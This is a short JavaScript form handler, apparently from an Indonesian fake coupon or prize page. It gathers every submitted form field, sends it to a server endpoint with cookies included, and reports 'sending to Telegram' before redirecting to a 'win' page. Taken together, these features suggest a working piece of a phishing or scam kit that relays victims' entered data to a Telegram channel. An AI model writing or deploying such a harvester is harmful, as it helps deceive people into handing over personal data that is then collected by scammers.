<script>
document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("formData");

  form.addEventListener("submit", async function (e) {
    e.preventDefault();
    document.getElementById("kirim").innerText = "Memproses Cetak Kupon....";

    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());

    try {
      const res = await fetch('/api/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        credentials: 'include', // penting biar cookie & IP ikut
        body: JSON.stringify(data)
      });

      const json = await res.json();

      if (json.success) {
        vibr(180); // kalau lo pake vibr.js
        setTimeout(() => {
          window.location.href = 'win.html'; // ✅ redirect manual
        }, 1500);
      } else {
        alert("Gagal mengirim ke Telegram. Coba lagi.");
      }
    } catch (err) {
      console.error("Error:", err);
      alert("Gagal submit form.");
    }
  });
});
</script>
